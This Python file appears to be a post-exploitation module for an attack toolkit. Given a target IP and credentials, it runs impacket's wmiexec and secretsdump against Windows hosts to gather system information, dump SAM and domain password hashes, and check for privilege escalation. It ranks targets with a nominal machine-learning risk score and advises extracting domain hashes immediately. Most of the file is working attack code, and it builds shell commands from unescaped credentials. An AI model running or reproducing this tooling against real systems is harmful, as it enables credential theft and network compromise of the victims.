#!/usr/bin/env python3

import subprocess
import json
import os
import re
from datetime import datetime
import pandas as pd
import numpy as np
from sklearn.ensemble import RandomForestClassifier
from sklearn.cluster import DBSCAN
import joblib

class PostExploitationAnalyzer:
    def __init__(self):
        self.model_path = 'models/post_exploit_model.joblib'
        self.model = None
        self.load_model()
        
    def load_model(self):
        """Load trained ML model"""
        try:
            if os.path.exists(self.model_path):
                self.model = joblib.load(self.model_path)
        except:
            self.model = None
    
    def analyze_system_info(self, system_info):
        """ML-based analysis of system information"""
        features = self._extract_system_features(system_info)
        
        if self.model:
            risk_score = self.model.predict_proba([list(features.values())])[0][1] * 100
        else:
            risk_score = self._heuristic_risk_score(features)
        
        return {
            'risk_score': risk_score,
            'critical_findings': self._identify_critical_findings(system_info),
            'recommendations': self._generate_recommendations(features)
        }
    
    def _extract_system_features(self, system_info):
        """Extract features from system information"""
        features = {
            'is_domain_controller': 1 if 'domain controller' in system_info.get('output', '').lower() else 0,
            'has_admin_privileges': 1 if 'administrator' in system_info.get('output', '').lower() else 0,
            'multiple_users': 1 if len(re.findall(r'user\s*:', system_info.get('output', ''), re.IGNORECASE)) > 3 else 0,
            'has_network_shares': 1 if 'share' in system_info.get('output', '').lower() else 0,
            'running_services': len(re.findall(r'service\s*:', system_info.get('output', ''), re.IGNORECASE)),
            'scheduled_tasks': len(re.findall(r'task\s*:', system_info.get('output', ''), re.IGNORECASE))
        }
        return features
    
    def _heuristic_risk_score(self, features):
        """Fallback heuristic risk scoring"""
        score = 0
        score += features['is_domain_controller'] * 40
        score += features['has_admin_privileges'] * 30
        score += features['multiple_users'] * 10
        score += features['has_network_shares'] * 20
        score += min(20, features['running_services'] * 2)
        score += min(10, features['scheduled_tasks'] * 2)
        return min(100, score)
    
    def _identify_critical_findings(self, system_info):
        """Identify critical findings using pattern matching"""
        findings = []
        output = system_info.get('output', '').lower()
        
        if 'domain controller' in output:
            findings.append('Domain Controller detected - High value target')
        if 'administrator' in output:
            findings.append('Administrator privileges obtained')
        if 'sql' in output:
            findings.append('SQL services detected - Potential data access')
        if 'backup' in output:
            findings.append('Backup services detected - Potential sensitive data')
            
        return findings
    
    def _generate_recommendations(self, features):
        """Generate ML-based recommendations"""
        recommendations = []
        
        if features['is_domain_controller']:
            recommendations.append({
                'priority': 'CRITICAL',
                'action': 'Extract domain hashes immediately',
                'confidence': 0.95
            })
        
        if features['has_admin_privileges']:
            recommendations.append({
                'priority': 'HIGH',
                'action': 'Dump password hashes',
                'confidence': 0.85
            })
        
        if features['has_network_shares']:
            recommendations.append({
                'priority': 'MEDIUM',
                'action': 'Enumerate network shares',
                'confidence': 0.7
            })
            
        return recommendations

# Global analyzer instance
post_exploit_analyzer = PostExploitationAnalyzer()

def run_command(command, timeout=120):
    """Run a system command and return results"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return {
            'success': result.returncode == 0,
            'output': result.stdout,
            'error': result.stderr,
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired:
        return {'success': False, 'error': 'Command timed out', 'output': ''}
    except Exception as e:
        return {'success': False, 'error': str(e), 'output': ''}

def gather_system_info(target_ip, username, password):
    """Gather comprehensive system information with ML analysis"""
    print(f"[*] Gathering system information from {target_ip}")
    
    results = {}
    
    # Basic system info using impacket
    try:
        system_info = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'systeminfo'")
        results['system_info'] = system_info
        
        # ML analysis
        if system_info['success']:
            results['ml_analysis'] = post_exploit_analyzer.analyze_system_info(system_info)
            
    except Exception as e:
        results['error'] = f"Impacket failed: {str(e)}"
    
    return results

def extract_hashes(target_ip, username, password):
    """Extract password hashes with ML success prediction"""
    print(f"[*] Attempting to extract hashes from {target_ip}")
    
    results = {}
    
    # Try different hash extraction methods
    methods = {
        'reg_save': f"python3 /usr/share/doc/python3-impacket/examples/secretsdump.py '{username}:{password}@{target_ip}'",
        'wmi_exec': f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'reg save hklm\\sam sam.save'"
    }
    
    for method_name, command in methods.items():
        result = run_command(command)
        results[method_name] = result
        
        # ML-based success prediction
        success_probability = _predict_hash_extraction_success(result, method_name)
        results[method_name]['success_probability'] = success_probability
        
        if result['success'] and ('NTLM' in result['output'] or 'Hash' in result['output']):
            print(f"[+] Hashes extracted via {method_name}!")
            break
    
    return results

def _predict_hash_extraction_success(result, method_name):
    """Predict hash extraction success probability"""
    # Simple heuristic - replace with trained model
    score = 0
    
    if result['success']:
        score += 60
    if 'NTLM' in result.get('output', ''):
        score += 30
    if 'Hash' in result.get('output', ''):
        score += 20
        
    return min(1.0, score / 100)

def check_privilege_escalation(target_ip, username, password):
    """Check for privilege escalation opportunities with ML analysis"""
    print(f"[*] Checking privilege escalation vectors on {target_ip}")
    
    results = {}
    
    # Check current privileges
    whoami = run_command(f"python3 /usr/share/doc/python3-impacket/examples/wmiexec.py '{username}:{password}@{target_ip}' 'whoami /priv'")
    results['current_privileges'] = whoami
    
    # ML-based privilege analysis
    if whoami['success']:
        results['privilege_analysis'] = _analyze_privileges(whoami['output'])
    
    return results

def _analyze_privileges(privilege_output):
    """ML-based analysis of system privileges"""
    analysis = {
        'high_risk_privileges': [],
        'escalation_opportunities': [],
        'risk_score': 0
    }
    
    # Simple pattern matching - replace with ML model
    high_risk_privs = ['SeDebugPrivilege', 'SeTcbPrivilege', 'SeBackupPrivilege', 'SeRestorePrivilege']
    
    for priv in high_risk_privs:
        if priv in privilege_output:
            analysis['high_risk_privileges'].append(priv)
            analysis['risk_score'] += 20
    
    analysis['risk_score'] = min(100, analysis['risk_score'])
    return analysis

def run_post_exploitation(target_ip, credentials):
    """Main function for post-exploitation activities with ML optimization"""
    print(f"\n{'='*60}")
    print(f"POST-EXPLOITATION MODULE - Target: {target_ip}")
    print(f"{'='*60}")
    
    results = {
        'target': target_ip,
        'timestamp': datetime.now().isoformat(),
        'credentials_used': credentials,
        'post_exploitation': {}
    }
    
    # Extract username and password
    username, password = "administrator", "password"
    if ':' in credentials:
        username, password = credentials.split(':', 1)
    
    # Run post-exploitation activities with ML analysis
    results['post_exploitation']['system_info'] = gather_system_info(target_ip, username, password)
    results['post_exploitation']['hash_extraction'] = extract_hashes(target_ip, username, password)
    results['post_exploitation']['privilege_escalation'] = check_privilege_escalation(target_ip, username, password)
    
    # Overall ML analysis
    results['ml_analysis'] = _analyze_post_exploitation_results(results['post_exploitation'])
    
    # Save results
    os.makedirs('results/post_exploitation', exist_ok=True)
    filename = f'results/post_exploitation/post_exploit_{target_ip}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    
    with open(filename, 'w') as f:
        json.dump(results, f, indent=4)
    
    print(f"[+] Post-exploitation results saved to {filename}")
    
    # Print ML-based summary
    print(f"\n{'='*40}")
    print("POST-EXPLOITATION SUMMARY (ML Analysis)")
    print(f"{'='*40}")
    
    ml_analysis = results.get('ml_analysis', {})
    print(f"Overall Risk Score: {ml_analysis.get('overall_risk', 0)}/100")
    print(f"Critical Findings: {len(ml_analysis.get('critical_findings', []))}")
    
    for finding in ml_analysis.get('critical_findings', [])[:3]:
        print(f"  ! {finding}")
    
    return results

def _analyze_post_exploitation_results(post_exploit_data):
    """ML-based analysis of post-exploitation results"""
    analysis = {
        'overall_risk': 0,
        'critical_findings': [],
        'recommendations': []
    }
    
    # Analyze system information
    if 'ml_analysis' in post_exploit_data.get('system_info', {}):
        sys_analysis = post_exploit_data['system_info']['ml_analysis']
        analysis['overall_risk'] += sys_analysis.get('risk_score', 0) * 0.4
        analysis['critical_findings'].extend(sys_analysis.get('critical_findings', []))
    
    # Analyze hash extraction results
    hash_results = post_exploit_data.get('hash_extraction', {})
    for method, result in hash_results.items():
        if isinstance(result, dict) and result.get('success'):
            analysis['overall_risk'] += 30
            analysis['critical_findings'].append(f"Hash extraction successful via {method}")
    
    # Analyze privilege escalation
    if 'privilege_analysis' in post_exploit_data.get('privilege_escalation', {}):
        priv_analysis = post_exploit_data['privilege_escalation']['privilege_analysis']
        analysis['overall_risk'] += priv_analysis.get('risk_score', 0) * 0.3
        analysis['critical_findings'].extend(priv_analysis.get('high_risk_privileges', []))
    
    analysis['overall_risk'] = min(100, analysis['overall_risk'])
    
    # Generate recommendations based on risk level
    if analysis['overall_risk'] >= 70:
        analysis['recommendations'].append('Immediate action required - High value compromise')
    elif analysis['overall_risk'] >= 40:
        analysis['recommendations'].append('Continue post-exploitation - Good access level')
    else:
        analysis['recommendations'].append('Limited access - Try alternative methods')
    
    return analysis

if __name__ == "__main__":
    # Test the module
    target = '10.0.3.20'
    test_creds = "administrator:password123"
    results = run_post_exploitation(target, test_creds)
    print(f"\nPost-exploitation simulation completed.")
